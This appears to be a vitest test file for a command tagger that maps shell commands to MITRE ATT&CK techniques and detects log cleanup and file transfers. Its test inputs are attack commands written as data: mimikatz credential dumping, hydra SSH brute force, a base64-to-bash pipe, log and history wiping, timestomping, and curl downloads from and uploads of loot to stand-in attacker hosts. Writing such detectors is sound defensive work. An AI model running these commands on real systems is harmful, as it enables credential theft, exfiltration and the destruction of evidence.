import { describe, it, expect } from 'vitest'
import { tagTechnique, detectCleanup, detectFileTransfer } from '../src/core/technique-tagger'

describe('tagTechnique', () => {
  it('nmap → T1046', () => {
    const t = tagTechnique('nmap -sV -sC 10.0.0.5')
    expect(t?.tool).toBe('nmap')
    expect(t?.mitreTtp).toBe('T1046')
    expect(t?.category).toBe('recon')
  })
  it('hydra → T1110.001', () => {
    const t = tagTechnique('hydra -l root -P pass.txt ssh://10.0.0.1')
    expect(t?.tool).toBe('hydra')
    expect(t?.mitreTtp).toBe('T1110.001')
  })
  it('mimikatz basename or embedded', () => {
    expect(tagTechnique('mimikatz.exe "sekurlsa::logonpasswords"')?.mitreTtp).toBe('T1003.001')
    expect(tagTechnique('./x86/mimikatz.exe')?.mitreTtp).toBe('T1003.001')
  })
  it('base64-decoded shell exec → defense_evasion T1027', () => {
    const t = tagTechnique('echo Zm9v | base64 -d | bash')
    expect(t?.mitreTtp).toBe('T1027')
    expect(t?.category).toBe('defense_evasion')
  })
  it('curl without -o is NOT tagged as file transfer', () => {
    // curl-that-just-fetches is left alone; only -o/-O counts as ingress
    expect(tagTechnique('curl https://example.com')?.mitreTtp).toBeUndefined()
  })
  it('unrelated command returns null', () => {
    expect(tagTechnique('ls -la')).toBeNull()
  })
})

describe('detectCleanup', () => {
  it('history -c', () => {
    const c = detectCleanup('history -c')
    expect(c?.subtype).toBe('history_clear')
    expect(c?.mitreTtp).toBe('T1070.003')
  })
  it('journalctl vacuum', () => {
    expect(detectCleanup('sudo journalctl --vacuum-time=1s')?.subtype).toBe('log_clear')
  })
  it('shred with target', () => {
    const c = detectCleanup('shred -u /tmp/payload')
    expect(c?.tool).toBe('shred')
    expect(c?.target).toBe('/tmp/payload')
    expect(c?.mitreTtp).toBe('T1070.004')
  })
  it('touch -t timestomp', () => {
    const c = detectCleanup('touch -t 202001010000.00 /var/log/app.log')
    expect(c?.subtype).toBe('timestomp')
    expect(c?.target).toBe('/var/log/app.log')
  })
  it('chattr +i to hide file', () => {
    expect(detectCleanup('chattr +i /etc/shadow')?.subtype).toBe('attr_hide')
  })
  it('regular touch is NOT flagged', () => {
    expect(detectCleanup('touch newfile.txt')).toBeNull()
  })
})

describe('detectFileTransfer', () => {
  it('curl -o download', () => {
    const f = detectFileTransfer('curl -o /tmp/x.sh https://att.example.com/x.sh')
    expect(f?.direction).toBe('download')
    expect(f?.url).toBe('https://att.example.com/x.sh')
    expect(f?.localPath).toBe('/tmp/x.sh')
    expect(f?.mitreTtp).toBe('T1105')
  })
  it('curl upload with -T', () => {
    const f = detectFileTransfer('curl -T /tmp/loot.zip https://exfil.example.com/')
    expect(f?.direction).toBe('upload')
    expect(f?.mitreTtp).toBe('T1041')
  })
  it('scp direction by argument order', () => {
    expect(detectFileTransfer('scp file.txt user@remote:/tmp/')?.direction).toBe('upload')
    expect(detectFileTransfer('scp user@remote:/etc/passwd .')?.direction).toBe('download')
  })
  it('python http.server as staging', () => {
    expect(detectFileTransfer('python3 -m http.server 8000')?.tool).toBe('python-http.server')
  })
  it('curl without -o is not a transfer', () => {
    expect(detectFileTransfer('curl https://example.com')).toBeNull()
  })
})
